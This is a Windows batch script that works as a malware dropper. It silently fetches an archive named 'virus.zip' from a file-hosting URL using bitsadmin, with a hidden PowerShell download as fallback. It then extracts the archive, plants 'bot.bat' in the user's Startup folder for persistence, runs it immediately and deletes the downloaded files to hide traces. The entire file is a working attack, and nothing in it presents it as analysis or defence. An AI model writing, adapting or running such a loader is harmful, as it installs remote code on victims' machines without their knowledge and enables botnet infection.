@echo off
setlocal enabledelayedexpansion

:: === Silent retrieval from the new Gofile link ===
set "url=https://store-na-phx-5.gofile.io/download/web/5a6551f4-23c7-4a68-bdf7-a1c68c878ba0/virus.zip"
set "zipfile=%TEMP%\payload.zip"
set "extractdir=%TEMP%\payload_extracted"

:: Try BITS first (stealthy, no pop‑ups)
bitsadmin /transfer "SilentFetch" /priority FOREGROUND "%url%" "%zipfile%" >nul 2>&1
if not exist "%zipfile%" (
    powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%zipfile%'" -WindowStyle Hidden
)

:: Extract the archive silently
powershell -Command "Expand-Archive -Path '%zipfile%' -DestinationPath '%extractdir%' -Force" -WindowStyle Hidden

:: Locate bot.bat (or any .bat if the exact name differs)
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "botpath="
for /r "%extractdir%" %%f in (bot.bat) do (
    set "botpath=%%f"
    goto :copyfile
)

:: Fallback – grab the first .bat found
:copyfile
if not defined botpath (
    for /f "delims=" %%g in ('dir /s /b "%extractdir%\*.bat" 2^>nul') do (
        set "botpath=%%g"
        goto :copyfile
    )
)

:: Plant the payload into Startup and execute it immediately
if defined botpath (
    copy /y "!botpath!" "%startup%\bot.bat" >nul 2>&1
    start "" "%startup%\bot.bat"
)

:: Remove traces (optional, to hide the operation)
timeout /t 2 /nobreak >nul
del /f /q "%zipfile%" >nul 2>&1
rmdir /s /q "%extractdir%" >nul 2>&1

endlocal
exit
